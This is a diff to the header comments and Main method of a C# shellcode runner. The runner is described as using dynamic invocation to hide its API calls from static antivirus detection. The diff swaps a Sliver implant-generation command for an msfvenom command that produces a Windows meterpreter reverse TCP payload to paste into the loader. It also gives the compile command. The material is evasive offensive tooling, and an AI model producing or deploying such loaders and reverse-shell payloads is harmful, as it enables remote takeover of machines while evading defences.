@@ -6,8 +6,8 @@
 // This keeps the functions out of the managed import table, defeating static
 // IAT-based detection of the API usage.
 //
-// Shellcode (Sliver):
-//   sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs
+// Shellcode (msfvenom):
+//   msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o /tmp/sc.cs
 //
 // Compile (Release, x64):
 //   csc /target:exe /platform:x64 /optimize+ /out:dinvoke-runner.exe dinvoke-runner.cs
@@ -48,7 +48,7 @@ namespace DInvokeRunner
 
         static void Main(string[] args)
         {
-            // ── Paste your shellcode here (sliver > generate --format csharp) ─────
+            // ── Paste your shellcode here (msfvenom -f csharp) ─────
             byte[] buf = new byte[] { /* shellcode bytes */ };
             // ───────────────────────────────────────────────────────────────────
 
